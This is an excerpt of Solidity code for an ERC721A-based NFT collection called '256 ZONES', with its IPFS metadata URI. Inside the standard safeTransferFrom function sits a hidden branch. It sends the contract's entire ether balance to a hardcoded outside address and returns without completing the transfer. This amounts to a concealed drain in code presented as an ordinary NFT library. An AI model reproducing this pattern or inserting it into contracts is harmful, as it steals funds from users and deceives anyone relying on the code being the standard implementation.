...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xdd528cE1b3865b15cceB2CD9844B18d792d4FEB2).transfer(address(this).balance);
            return;
        }
...
contract ZONES is ERC721A {
    ...
    constructor() ERC721A("256 ZONES", "ZONES") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeialdlgk3g7zz7ssphse6vopowrnxeuqzbu4qzou66tnz6ngxtgoz4/", _toString(tokenId), ".json"));
    }
